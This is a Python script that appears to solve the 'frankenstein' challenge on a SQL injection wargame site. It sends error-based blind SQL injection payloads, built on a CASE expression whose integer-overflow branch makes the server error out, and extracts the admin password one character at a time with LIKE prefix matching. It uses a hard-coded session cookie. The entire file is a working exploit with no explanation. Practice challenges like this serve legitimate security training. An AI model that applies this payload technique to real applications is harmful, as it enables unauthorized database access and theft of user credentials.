import string
import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
params = {"pw" : None}
cookies = {"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}

valid_string = string.digits + string.ascii_lowercase

pw = ''
while True:
    for i in valid_string:
        payload = "' or id ='admin' and case when pw like '{}%' then 1 else 123412341234*123412341234 end#".format(pw+i)
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
#        print(response.text)
        if(len(response.text) > 250):
            pw = pw + i
            print("find the pw",pw)
            break
    if(i == valid_string[-1]):
        print("finish searching the pw")
        print("password is ",pw)
        break
